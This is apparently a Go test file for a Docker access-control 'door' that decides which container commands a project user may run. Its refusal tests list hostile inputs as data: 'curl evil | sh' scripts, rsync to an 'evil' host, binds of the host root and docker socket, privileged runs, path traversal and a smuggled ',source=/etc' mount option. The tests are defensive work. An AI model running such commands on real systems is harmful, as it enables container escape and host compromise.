package door

import (
	"errors"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// fakeDaemon holds containers by name and id, each with its labels.
type fakeDaemon map[string]map[string]string

func (d fakeDaemon) Inspect(target string) (string, map[string]string, error) {
	labels, ok := d[target]
	if !ok {
		return "", nil, errors.New("no such container")
	}
	copied := map[string]string{}
	for k, v := range labels {
		copied[k] = v
	}
	return target, copied, nil
}

func (d fakeDaemon) Containers() ([]string, error) {
	var ids []string
	for id := range d {
		ids = append(ids, id)
	}
	slices.Sort(ids)
	return ids, nil
}

// testImages are the images on the fake daemon, by every name they go by: id first.
var testImages = [][]string{
	{"sha256:aaa", "shop-prod-web", "shop-prod-web:latest"},
	{"sha256:bbb", "busybox:devopsy-shop-prod-20240101000000"},
	{"sha256:ccc", "blog-prod-web", "blog-prod-web:latest"},
	{"sha256:ddd", "busybox:devopsy-blog-prod-20240101000000"},
	{"sha256:eee", "postgres:16"},
	{"sha256:fff", "registry.example.com/blog/private:1"},
}

// Image finds an image by id or name.
func (d fakeDaemon) Image(ref string) (string, []string, error) {
	for _, img := range testImages {
		if slices.Contains(img, ref) {
			return img[0], img[1:], nil
		}
	}
	return "", nil, errors.New("no such image")
}

var testDaemon = fakeDaemon{
	"mine":   {"com.docker.compose.project": "shop-prod", "traefik.enable": "true", "devopsy.door": "devopsy-shop"},
	"task":   {"devopsy.env": "shop-dev", "devopsy.task": "owners", "devopsy.door": "devopsy-shop"},
	"victim": {"com.docker.compose.project": "other-prod", "traefik.http.routers.x.rule": "secret", "devopsy.export.BASE": "b", "devopsy.role": "proxy"},
	"bare":   {},
	// Under this project's names, made outside the door: by the deploy user, or for another user.
	"adopted": {"com.docker.compose.project": "shop-prod", "secret": "s"},
	"theirs":  {"devopsy.env": "shop-prod", "devopsy.task": "owners", "devopsy.door": "devopsy-other", "secret": "s"},
}

// fakeHost is fakePaths with the door's own space.
type fakeHost struct {
	fakePaths
	dirs   map[string]bool
	copied []string
	worked int
}

func (h *fakeHost) IsDir(path string) bool { return h.dirs[path] }

func (h *fakeHost) CopyIn(path string, _ bool) (string, error) {
	h.copied = append(h.copied, path)
	return "/space/work/in/" + filepath.Base(path), nil
}

func (h *fakeHost) WorkDir() (string, error) {
	h.worked++
	return "/space/work/out", nil
}

var testKnown = Known{
	Image: "util:1", Dockerfile: "FROM alpine\n", Owners: "own script", Export: "export script", Import: "import script",
	ReflinkProbe: "probe", SnapshotTar: "tar script", Space: "space script", Share: "share script",
	Daemon: "daemon script", Restore: "restore script", Receive: "receive script", RsyncCopy: []string{"rsync", "-a"}, Clone: CloneScriptForm,
}

const daemonSettings = "uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n"

// receive is a sync's receive as devopsy's child runs it (receiveOne): the entry or volume at
// mount alone, no network, rsync's words after RsyncCopy over the session (known.Receive).
func receive(mount string, args ...string) []string {
	return slices.Concat([]string{"run", "--rm", "-i", "--network", "none", "-v", mount, "util:1", "sh", "-c", "receive script"}, testKnown.RsyncCopy, args)
}

func decide(t *testing.T, argv ...string) (*Action, error) {
	t.Helper()
	return Decide(argv, testPolicy, testDaemon, &fakeHost{}, testKnown)
}

func TestDecideRefuses(t *testing.T) {
	t.Parallel()
	entry := "/space/mnt/shop-prod/data"
	tests := []struct {
		name string
		argv []string
	}{
		{"nothing", nil},
		{"logs of another", []string{"logs", "victim"}},
		{"cp", []string{"cp", "victim:/x", "/y"}},
		{"info", []string{"info"}},
		{"system prune", []string{"system", "prune", "-f"}},
		{"exec in its own", []string{"exec", "mine", "sh"}},
		{"exec in another, the daemon's form", []string{"exec", "-i", "victim", "rsync", "--server", "--daemon", "--config=/etc/rsyncd.conf", "."}},
		{"inspect of another", []string{"inspect", "victim"}},
		{"inspect by a format of another", []string{"inspect", "--format", "{{json .}}", "victim"}},
		{"inspect by a format's other spelling", []string{"inspect", "--format={{json .Config.Env}}", "victim"}},
		{"inspect with a flag it does not know", []string{"inspect", "--type", "image", "mine"}},
		{"a network of another", []string{"network", "inspect", "other-prod_default"}},
		{"a network holding its name later", []string{"network", "inspect", "x-shop-prod"}},
		{"connect", []string{"network", "connect", "traefik", "mine"}},
		{"a name that only starts the same", []string{"network", "inspect", "shopx-prod_default"}},
		{"image rm, forced", []string{"image", "rm", "-f", "shop-prod-app"}},
		{"volume of another", []string{"volume", "inspect", "other-prod_data"}},
		{"volume rm", []string{"volume", "rm", "shop-prod_data"}},
		{"tag over a name others use", []string{"tag", "x", "busybox:1.37"}},
		{"tag a hold of another's", []string{"tag", "x", "busybox:devopsy-other-prod-1"}},
		{"tag with no id", []string{"tag", "x", "busybox:devopsy-shop"}},
		{"rm of another", []string{"rm", "-f", "victim"}},
		{"rm of one with no owner", []string{"rm", "bare"}},
		{"rm, a flag", []string{"rm", "--volumes", "mine"}},
		{"a build", []string{"build", "-t", "x", "-"}},
		{"a build of its image from a context", []string{"build", "-t", "util:1", "."}},
		{"a build with a build arg", []string{"build", "--build-arg", "A=1", "-t", "util:1", "-"}},
		{"any image", []string{"run", "--rm", "busybox", "sh"}},
		{"privileged", []string{"run", "--privileged", "util:1", "sh", "-c", "own script"}},
		{"a user", []string{"run", "--user", "0", "util:1", "sh", "-c", "own script"}},
		{"a capability", []string{"run", "--cap-add", "ALL", "util:1", "sh", "-c", "own script"}},
		{"pid host", []string{"run", "--pid", "host", "util:1", "sh", "-c", "own script"}},
		{"a script of its own", []string{"run", "util:1", "sh", "-c", "curl evil | sh"}},
		{"a program of its own", []string{"run", "util:1", "sh"}},
		{"a bind of the host, its own script", []string{"run", "-v", "/:/h", "util:1", "sh", "-c", "own script"}},
		{"a bind of the socket", []string{"run", "-v", "/var/run/docker.sock:/s", "util:1", "sh", "-c", "own script"}},
		{"another's entry", []string{"run", "-v", "/space/mnt/other-prod/data:/d", "util:1", "sh", "-c", "own script"}},
		{"another's mnt", []string{"run", "-v", "/space/mnt/other-prod:/d", "util:1", "sh", "-c", "own script"}},
		{"all of mnt", []string{"run", "-v", "/space/mnt:/d", "util:1", "sh", "-c", "own script"}},
		{"under an entry", []string{"run", "-v", entry + "/x:/d", "util:1", "sh", "-c", "own script"}},
		{"another's volume", []string{"run", "-v", "other-prod_data:/d", "util:1", "sh", "-c", "own script"}},
		// A volume is <compose name>_<key> (OwnVolume), as every one a project makes is named:
		// a name of its own with no key is no volume of its own.
		{"a volume of its own name with no key", []string{"run", "-v", "/space/mnt/shop-prod:/m:ro", "-v", "shop-prod:/v/db:ro", "util:1", "du", "-sk", "/m/data", "/v/db"}},
		{"bind propagation", []string{"run", "-v", entry + ":/d:rshared", "util:1", "sh", "-c", "own script"}},
		{"a mount with options", []string{"run", "--mount", "type=bind,source=" + entry + ",target=/d,bind-propagation=rshared", "util:1", "sh", "-c", "own script"}},
		{"a volume's driver options", []string{"run", "--mount", "type=volume,source=shop-prod_v,target=/d,volume-opt=device=/", "util:1", "sh", "-c", "own script"}},
		{"tmpfs", []string{"run", "--mount", "type=tmpfs,target=/d", "util:1", "sh", "-c", "own script"}},
		{"the host's network for a script", []string{"run", "--network", "host", "util:1", "sh", "-c", "own script"}},
		{"another's network", []string{"run", "--network", "other-prod_default", "util:1", "sh", "-c", "own script"}},
		{"the host's network to anywhere", []string{"run", "--network", "host", "util:1", "rsync", "-a", "rsync://evil:873/x/", "/mnt/x/"}},
		{"rsync out of its form", []string{"run", "util:1", "rsync", "-a", "--rsh=evil", "/src/x/", "/dst/x/"}},
		{"rsync from a path", []string{"run", "util:1", "rsync", "-a", "/etc/", "/dst/x/"}},
		{"another's label", []string{"run", "--label", "devopsy.env=other-prod", "util:1", "sh", "-c", "own script"}},
		{"a label of its choosing", []string{"run", "--label", "traefik.enable=true", "util:1", "sh", "-c", "own script"}},
		{"another's name, no label", []string{"run", "--name", "devopsy-owners-other-prod-1", "util:1", "sh", "-c", "own script"}},
		{"a name of another's", []string{"run", "--name", "other-prod-web-1", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
		{"an environment", []string{"run", "-e", "A=1", "util:1", "sh", "-c", "own script"}},
		{"its daemon's settings for its own script", []string{"run", "-e", "RSYNCD_CONF=uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n", "util:1", "sh", "-c", "own script"}},
		{"a daemon with another's settings", []string{"run", "-e", "RSYNCD_CONF=uid = 0\n[x]\npath = /", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon writing", []string{"run", "-e", "RSYNCD_CONF=" + strings.Replace(daemonSettings, "read only = yes", "read only = no", 1), "util:1", "sh", "-c", "daemon script"}},
		{"a daemon serving the host", []string{"run", "-e", "RSYNCD_CONF=" + daemonSettings + "[x]\npath = /etc\n", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon with no settings", []string{"run", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon published to the world", []string{"run", "-p", "873:873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
		{"a daemon on the host's loopback", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
		{"a daemon on a network", []string{"run", "--network", "bridge", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
		{"a receive on the host's network", slices.Concat([]string{"run", "--network", "host", "-v", "/space/mnt/shop-prod/data:/mnt/data", "util:1", "sh", "-c", "receive script"}, testKnown.RsyncCopy, []string{"devopsy::data/", "/mnt/data/"})},
		{"a receive from a daemon on a port", receive("/space/mnt/shop-prod/data:/mnt/data", "rsync://127.0.0.1:22/data/", "/mnt/data/")},
		{"a receive into the whole mnt", receive("/space/mnt/shop-prod:/mnt", "devopsy::data/", "/mnt/data/")},
		{"a receive into another entry than its own module", receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::other/", "/mnt/data/")},
		{"a password for its own script", []string{"run", "-e", "RSYNC_PASSWORD", "util:1", "sh", "-c", "own script"}},
		{"a secret in the command line", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD=x", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"}},
		{"a volume of another's", []string{"volume", "create", "--label", "com.docker.compose.project=other-prod", "--label", "com.docker.compose.volume=d", "other-prod_d"}},
		{"a volume with options", []string{"volume", "create", "-o", "device=/", "--label", "com.docker.compose.volume=d", "shop-prod_d"}},
		{"a pull with a flag", []string{"pull", "--platform", "x", "busybox"}},
		{"the port of its own daemon", []string{"port", "mine", "873"}},
		{"its daemon serving something else", []string{"exec", "-i", "mine", "rsync", "--server", "--daemon", "--config=/mnt/x", "."}},
		{"a clone script running more", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncurl evil | sh\n"}},
		{"a clone from outside /m", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncp -a --reflink=always '/etc' '/c/mnt/' || cp -a --reflink=always '/etc' '/c/mnt/'\n"}},
		{"another's clones", []string{"run", "-v", "/space/clones/other/a:/c", "util:1", "sh", "-c", "own script"}},
		{"all clones", []string{"run", "-v", "/space/clones:/c", "util:1", "sh", "-c", "own script"}},
		{"du of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/m", "util:1", "du", "-sk", "/m/.."}},
		{"rsync of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/src", "util:1", "rsync", "-a", "/src/../", "/dst/x/"}},
		{"a removal of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/s", "util:1", "rm", "-rf", "/s/.."}},
		{"a removal outside its form", []string{"run", "-v", "/home/devopsy-shop/shop/prod/s:/s", "util:1", "rm", "-rf", "/s/../../x"}},
		{"a restore of another's file", []string{"run", "-v", "/home/devopsy-other/other/x:/s:ro", "-v", "/home/devopsy-shop/shop/f:/o", "util:1", "sh", "-c", "restore script", "sh", "f"}},
		{"a restore's file walking out", []string{"run", "-v", "/home/devopsy-shop/shop/s:/s:ro", "-v", "/home/devopsy-shop/shop/f:/o", "util:1", "sh", "-c", "restore script", "sh", "../../x"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, tt.argv...)
			var r *Refusal
			if !errors.As(err, &r) {
				t.Errorf("not refused: %+v, %v", a, err)
			}
		})
	}
}

// Filters widen each other, so a listing is cut by id whatever they say.
func TestDecidePS(t *testing.T) {
	t.Parallel()
	cut := []string{"--filter", "id=mine", "--filter", "id=task"}
	tests := []struct {
		name string
		args []string
		want []string
	}{
		{"nothing", nil, cut},
		{"a name filter of its own, widened", []string{"--filter", "name=shop-prod", "--filter", "name=victim"}, cut},
		{"a label filter that only looks like its own", []string{"--filter", "label=x=shop-prod"}, cut},
		{"a label of its own, widened by another's", []string{"--filter", "label=com.docker.compose.project=shop-prod", "--filter", "label=com.docker.compose.project=other-prod"}, cut},
		{"all, with its format", []string{"-a", "--format", "{{.Labels}}"}, cut},
		{"a role's holder, with more of it", []string{"--filter", "label=devopsy.role=proxy", "--format", "{{.Labels}}"}, cut},
		{"imports' look, with more", []string{"-q", "--no-trunc", "-a", "--filter", "name=x"}, cut},
		// Filters of one key widen each other: a caller's id filter beside the door's own
		// would bring another's row back, all its labels included. Docker's CLI trims a
		// filter's key and lowercases it, so every spelling of id goes.
		{"an id filter of another's", []string{"-a", "--filter", "id=victim", "--format", "{{.Labels}}"}, cut},
		{"an id filter in capitals", []string{"-a", "--filter", "ID=victim", "--format", "{{.Labels}}"}, cut},
		{"an id filter in mixed case", []string{"-a", "--filter=Id=victim", "--format", "{{json .}}"}, cut},
		{"an id filter with spaces", []string{"-a", "--filter", " id =victim"}, cut},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, append([]string{"ps"}, tt.args...)...)
			if err != nil {
				t.Fatal(err)
			}
			got := a.Docker[len(a.Docker)-len(tt.want):]
			if !slices.Equal(got, tt.want) {
				t.Errorf("ends %q, want %q", got, tt.want)
			}
			for _, arg := range a.Docker {
				key, value, _ := strings.Cut(arg, "=")
				if strings.ToLower(strings.TrimSpace(key)) == "id" && (strings.Contains(value, "victim") || strings.Contains(value, "bare")) {
					t.Errorf("reaches another's: %q", a.Docker)
				}
			}
		})
	}
	// devopsy's own looks, which tell nothing.
	for _, args := range [][]string{
		{"-q", "--no-trunc"},
		{"--filter", "label=devopsy.role=proxy", "--format", `{{.Label "com.docker.compose.project"}}`},
	} {
		a, err := decide(t, append([]string{"ps"}, args...)...)
		if err != nil || slices.Contains(a.Docker, "id=mine") {
			t.Errorf("%q: %v, %v", args, a, err)
		}
	}
	// With nothing of its own: its format and no rows, never everyone's.
	a, err := Decide([]string{"ps"}, Policy{Project: "empty"}, testDaemon, &fakeHost{}, testKnown)
	if err != nil || !slices.Contains(a.Docker, "id=0000000000000000") {
		t.Errorf("nothing of its own: %v, %v", a, err)
	}
}

func TestDecideInspectLabels(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "inspect", "--format", "{{.Id}} {{json .Config.Labels}}", "mine", "victim", "gone")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(a.Output, "traefik.enable") {
		t.Errorf("its own labels are cut: %s", a.Output)
	}
	if strings.Contains(a.Output, "secret") {
		t.Errorf("another's unexported labels show: %s", a.Output)
	}
	if !strings.Contains(a.Output, `"devopsy.export.BASE":"b"`) || !strings.Contains(a.Output, `"devopsy.role":"proxy"`) {
		t.Errorf("another's exports are missing: %s", a.Output)
	}
	if strings.Contains(a.Output, "gone") {
		t.Errorf("a missing container shows: %s", a.Output)
	}
}

// The door acts only on containers it made for this user (DoorLabel): compose's and devopsy's
// labels are anyone's to set outside it, so a container the deploy user made under this
// project's names, as root and with any mount, stays out of the project user's reach.
func TestDecideOnlyWhatTheDoorMade(t *testing.T) {
	t.Parallel()
	for _, id := range []string{"adopted", "theirs"} {
		for _, argv := range [][]string{
			{"inspect", id}, {"rm", "-f", id}, {"exec", "-i", id, "rsync", "--server", "--daemon", "--config=/etc/rsyncd.conf", "."},
		} {
			if _, err := decide(t, argv...); err == nil {
				t.Errorf("%q: not refused", argv)
			}
		}
		if a, err := decide(t, "ps", "-a"); err != nil || slices.Contains(a.Docker, "id="+id) {
			t.Errorf("ps lists %s: %v, %v", id, a, err)
		}
		if a, err := decide(t, "inspect", "--format", "{{.Id}} {{json .Config.Labels}}", id); err != nil || strings.Contains(a.Output, "secret") {
			t.Errorf("its labels show: %v, %v", a, err)
		}
	}
	got := testPolicy.Foreign(testDaemon)
	if !slices.Equal(got, []string{"adopted", "theirs"}) {
		t.Errorf("foreign under its names: %q", got)
	}
	// What it starts carries its label, the caller's own refused.
	a, err := decide(t, "run", "-v", "/space/mnt/shop-prod:/m:ro", "util:1", "du", "-sk", "/m/data")
	if err != nil || !strings.Contains(strings.Join(a.Docker, " "), "--label devopsy.door=devopsy-shop ") {
		t.Errorf("a util container's labels: %v, %v", a, err)
	}
	if _, err := decide(t, "run", "--label", "devopsy.door=devopsy-shop", "-v", "/space/mnt/shop-prod:/m:ro", "util:1", "du", "-sk", "/m/data"); err == nil {
		t.Error("a caller's door label: not refused")
	}
	file := map[string]any{"name": "shop-prod", "services": map[string]any{
		"web": map[string]any{"image": "busybox:1.37"},
		"db":  map[string]any{"image": "busybox:1.37", "labels": map[string]any{"a": "b"}},
	}}
	testPolicy.Label(file)
	for _, svc := range []string{"web", "db"} {
		labels, _ := file["services"].(map[string]any)[svc].(map[string]any)["labels"].(map[string]any)
		if labels["devopsy.door"] != "devopsy-shop" {
			t.Errorf("%s: labels %v", svc, labels)
		}
	}
}

func TestDecideAllows(t *testing.T) {
	t.Parallel()
	entry := "/space/mnt/shop-prod/data"
	for _, argv := range [][]string{
		{"version"},
		{"inspect", "mine"},
		{"inspect", "--format", "{{.Id}}", "mine", "task"},
		{"network", "inspect", "-f", "x", "shop-prod_default"},
		{"network", "inspect", "traefik"},
		{"image", "inspect", "--format", "{{json .}}", "busybox:1.37"},
		{"image", "rm", "busybox:devopsy-shop-prod-1", "shop-prod-app:latest"},
		{"volume", "inspect", "--format", "{{.Name}}", "shop-prod_data"},
		{"tag", "sha256:abc", "busybox:devopsy-shop-prod-20260101"},
		{"rm", "-f", "mine"},
		{"exec", "-i", "task", "rsync", "--server", "--daemon", "--config=/etc/rsyncd.conf", "."},
		{"run", "--rm", "--name", "devopsy-owners-1", "--label", "devopsy.env=shop-prod", "--label", "devopsy.task=owners", "--network", "none",
			"--mount", "type=bind,source=" + entry + ",target=/mnt/data", "util:1", "sh", "-c", "own script", "sh", "data", "10001:10001"},
		{"run", "--mount", "type=bind,source=" + entry + ",target=/x/data,readonly", "-v", "shop-prod_db:/x/db:ro", "util:1", "sh", "-c", "export script", "sh", "data", "db"},
		{"run", "--network", "none", "--mount", "type=bind,source=" + entry + ",target=/mnt/data", "--mount", "type=bind,source=/home/devopsy-shop/shop/prod/t.tar,target=/in/t.tar,readonly", "util:1", "sh", "-c", "import script", "sh", "/in/t.tar", "data", "data", "./data/x"},
		{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", "/home/devopsy-shop/shop/prod/snapshots/1.tmp/data:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "mnt.data.tar.zst", "1:2"},
		{"run", "--mount", "type=bind,source=" + entry + ",target=/s,readonly", "--mount", "type=bind,source=/space/mnt/shop-dev/data,target=/d", "util:1", "sh", "-c", "share script", "sh", "/s", "/d"},
		{"run", "-v", "/space/mnt/shop-prod:/m:ro", "-v", "shop-prod_db:/v/db:ro", "util:1", "du", "-sk", "/m/data", "/v/db"},
		{"run", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "find", "/mnt", "-mindepth", "1", "-delete"},
		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--chown=1:1", "/src/data/", "/dst/data/"},
		receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"),
		{"run", "-d", "--network", "none", "-e", "RSYNCD_CONF=" + daemonSettings + "[data]\npath = /mnt/data\n[app.ini]\npath = /mnt\ninclude = /app.ini\nexclude = *\n", "-v", "/space/mnt/shop-prod:/mnt:ro", "util:1", "sh", "-c", "daemon script"},
		{"run", "-v", "/space/clones/shop/abc/mnt:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"},
		{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", "/space/clones/shop/abc:/c", "util:1", "sh", "-c", "probe", "sh", "/m/mnt/data"},
	} {
		if _, err := decide(t, argv...); err != nil {
			t.Errorf("%q: %v", argv, err)
		}
	}
}

// A --mount's source stays one path once place's answer is put back into it: a link in
// the tree to a path holding `,source=/etc` passes as a clone or an entry of this
// project's, and Docker takes the last source, so a root util container would hold any
// host path.
func TestDecideRunMountSourceStaysOnePath(t *testing.T) {
	t.Parallel()
	link := "/home/devopsy-shop/shop/prod/link"
	for _, end := range []string{"/space/clones/shop/a,source=/etc", "/space/mnt/shop-a,source=/etc"} {
		host := &fakeHost{fakePaths: fakePaths{links: map[string]string{link: end}}}
		a, err := Decide([]string{"run", "--mount", "type=bind,source=" + link + ",target=/x", "util:1", "sh", "-c", "own script"}, testPolicy, testDaemon, host, testKnown)
		if err == nil {
			t.Errorf("%s: a second source reaches docker: %q", end, a.Docker)
		}
	}
}

// A mount's target never sits over the util image's own files: a project's files, copied
// in read-only, would replace its binaries, and "own script" would run the project's find
// or rsync as root, with --network host on a sync's receive. A util container runs only
// what devopsy gives it (internals/door.md).
func TestDecideRunTargetsLeaveTheImageAlone(t *testing.T) {
	t.Parallel()
	bin := "/home/devopsy-shop/shop/prod/bin"
	for _, target := range []string{"/usr/bin", "/bin", "/lib", "/etc"} {
		if a, err := decide(t, "run", "-v", bin+":"+target+":ro", "util:1", "sh", "-c", "own script"); err == nil {
			t.Errorf("a project's files over %s: %q", target, a.Docker)
		}
	}
	if a, err := decide(t, slices.Insert(receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"), 5, "-v", bin+":/usr/bin:ro")...); err == nil {
		t.Errorf("a project's files over a receive's rsync, as root: %q", a.Docker)
	}
}

// The door answers what devopsy itself asks outside its util containers, or a project
// user's release fails there: ensureVolumes (--import into a missing volume, a child's
// prepare, --reset after its down --volumes), and images' Pull (a rollback or restart
// whose image is gone from the server, a restore's landing).
func TestDecideAnswersWhatDevopsyAsks(t *testing.T) {
	t.Parallel()
	for _, argv := range [][]string{
		{"volume", "create", "--label", "com.docker.compose.project=shop-prod", "--label", "com.docker.compose.volume=data", "shop-prod_data"},
		{"pull", "-q", "busybox@sha256:abc"},
	} {
		if _, err := decide(t, argv...); err != nil {
			t.Errorf("%q: %v", argv, err)
		}
	}
}

// A root container never holds a path a project user can change: what is read is
// copied in by that user's rights, what is written goes back by them, and what the
// container runs gives up what it does not need.
func TestDecideRunKeepsRootOffTheTree(t *testing.T) {
	t.Parallel()
	tree := "/home/devopsy-shop/shop/prod"
	host := &fakeHost{}
	a, err := Decide([]string{"run", "-v", tree + "/stream:/in/stream:ro", "-v", "/space/mnt/shop-prod/data:/mnt/data",
		"util:1", "sh", "-c", "import script", "sh", "/in/stream", "data", "data"}, testPolicy, testDaemon, host, testKnown)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(a.Docker, " ")
	if strings.Contains(joined, tree) {
		t.Errorf("a root container holds the tree: %s", joined)
	}
	for _, want := range []string{"/space/work/in/stream:/in/stream:ro", "/space/mnt/shop-prod/data:/mnt/data", "--network none", "--cap-drop MKNOD", "--security-opt no-new-privileges"} {
		if !strings.Contains(joined, want) {
			t.Errorf("no %q in %s", want, joined)
		}
	}
	// A tar's output goes back by that user's rights.
	a, err = decide(t, "run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", tree+"/out:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "f.zst", "1:2")
	if err != nil {
		t.Fatal(err)
	}
	if len(a.Collect) != 1 || a.Collect[0] != (Collect{"/space/work/out", tree + "/out"}) {
		t.Errorf("what goes back: %+v", a.Collect)
	}
	if len(host.copied) != 1 || host.copied[0] != tree+"/stream" {
		t.Errorf("what comes in: %v", host.copied)
	}
	// A path the project user swapped out of its tree.
	host = &fakeHost{fakePaths: fakePaths{links: map[string]string{tree + "/out": "/etc"}}}
	if _, err := Decide([]string{"run", "-v", tree + "/out:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "f.zst", "1:2"}, testPolicy, testDaemon, host, testKnown); err == nil {
		t.Error("a link out of its tree went through")
	}
	// A removal in its tree is its own to do.
	a, err = decide(t, "run", "-v", tree+"/snapshots:/s", "util:1", "rm", "-rf", "/s/.clone")
	if err != nil || len(a.Docker) != 0 || !slices.Equal(a.Remove, []string{tree + "/snapshots/.clone"}) {
		t.Errorf("a removal: %+v, %v", a, err)
	}
	// Whether its tree takes reflinks: no.
	a, err = decide(t, "run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", tree+"/snapshots/.clone:/c", "util:1", "sh", "-c", "probe", "sh", "/m/mnt/data")
	if err != nil || a.Exit != 1 || len(a.Docker) != 0 {
		t.Errorf("a reflink probe: %+v, %v", a, err)
	}
	// A restore holds nothing at all.
	a, err = decide(t, "run", "--name", "shop-prod-x", "-v", tree+"/s/data:/s:ro", "-v", tree+"/s/fifo:/o", "util:1", "sh", "-c", "restore script", "sh", "f.zst")
	if err != nil || a.Stream == nil {
		t.Fatalf("a restore: %+v, %v", a, err)
	}
	if a.Stream.From != tree+"/s/data/f.zst" || a.Stream.To != tree+"/s/fifo/tar" {
		t.Errorf("its ends: %+v", a.Stream)
	}
	if strings.Contains(strings.Join(a.Stream.Docker, " "), tree) || !slices.Contains(a.Stream.Docker, "ALL") {
		t.Errorf("its container: %q", a.Stream.Docker)
	}
}

// The util image comes from the door's Dockerfile, whatever arrives on stdin.
func TestDecideBuildsItsOwnDockerfile(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "build", "-q", "--pull", "--no-cache", "-t", "util:1", "-")
	if err != nil {
		t.Fatal(err)
	}
	if a.Stdin != testKnown.Dockerfile {
		t.Errorf("builds from %q", a.Stdin)
	}
}

// A clone's real script, whose names come from a project's labels.
func TestCloneScriptForm(t *testing.T) {
	t.Parallel()
	good := "set -e\nmkdir -p /c/mnt /c/volumes\ncp -a --reflink=always '/m/mnt/data' '/c/mnt/' || cp -a --reflink=always '/m/mnt/data' '/c/mnt/'\nmkdir -p '/c/volumes/db'\ncp -a --reflink=always '/m/volumes/db/.' '/c/volumes/db/' || cp -a --reflink=always '/m/volumes/db/.' '/c/volumes/db/'\n"
	if !CloneScriptForm(good) {
		t.Error("its own form is refused")
	}
	for _, bad := range []string{
		"", "set -e\n", "curl evil\n" + good,
		good + "rm -rf /\n",
		strings.Replace(good, "/m/mnt/data", "/m/mnt/../..", 2),
		strings.Replace(good, "data", "x'; evil; '", 1),
		strings.Replace(good, "'/c/mnt/'", "'/etc/'", 1),
	} {
		if CloneScriptForm(bad) {
			t.Errorf("taken: %q", bad)
		}
	}
}

// A removal goes by where the path ends: root's for a clone behind its link, the
// project user's in its tree, and neither anywhere else.
func TestDecideRunRemovals(t *testing.T) {
	t.Parallel()
	snaps := "/home/devopsy-shop/shop/prod/snapshots"
	clones := "/space/clones/shop/abc"
	host := &fakeHost{fakePaths: fakePaths{links: map[string]string{snaps + "/.clone": clones, snaps + "/.clone/1": clones + "/1", snaps + "/out": "/etc"}}}
	run := func(paths ...string) (*Action, error) {
		return Decide(append([]string{"run", "-v", snaps + ":/s", "util:1", "rm", "-rf"}, paths...), testPolicy, testDaemon, host, testKnown)
	}
	a, err := run("/s/.clone/1")
	if err != nil || !slices.Contains(a.Docker, "/s/abc/1") || len(a.Remove) != 0 {
		t.Errorf("a clone by id: %+v, %v", a, err)
	}
	a, err = run("/s/.clone")
	if err != nil || !slices.Contains(a.Docker, "/s/abc") || !slices.Equal(a.Remove, []string{snaps + "/.clone"}) {
		t.Errorf("the clones and their link: %+v, %v", a, err)
	}
	a, err = run("/s/1.tmp")
	if err != nil || len(a.Docker) != 0 || !slices.Equal(a.Remove, []string{snaps + "/1.tmp"}) {
		t.Errorf("its own: %+v, %v", a, err)
	}
	if a, err = run("/s/out"); err == nil {
		t.Errorf("a link out of its tree: %+v", a)
	}
	// Inside a clone's copy, where the project user's own directories are (CloneDir), no
	// removal goes: only a clone or a take, the door's and a root copy's.
	host.links[snaps+"/.clone/1/mnt/data"] = clones + "/1/mnt/data"
	if a, err = run("/s/.clone/1/mnt/data"); err == nil {
		t.Errorf("a removal inside a clone's copy: %+v", a)
	}
}

// What of the image store is the server's is the admin's: for a project user there is
// nothing to do, nothing was refused for it, and a release says nothing about it.
func TestDecideImagePruneAndOthersDoNothing(t *testing.T) {
	t.Parallel()
	for _, argv := range [][]string{{"image", "prune", "-f"}, {"image", "rm", "busybox:1.37"}, {"image", "rm", "other-prod-app"}} {
		a, err := decide(t, argv...)
		if err != nil || len(a.Docker) != 0 || a.Exit != 0 {
			t.Errorf("%q: %+v, %v", argv, a, err)
		}
	}
	// Another project's hold under a repository this project names (its bookmark on a Docker
	// Hub image under this project's names, mongo-express:devopsy-shop-prod-1 for mongo) is
	// that project's reference count: never this one's to remove, whatever the repository.
	for _, argv := range [][]string{{"image", "rm", "shop-prod-web:devopsy-blog-prod-20260101000000"}, {"image", "rm", "shop-prod-web:latest", "shop-prod-web:devopsy-blog-prod-20260101000000"}} {
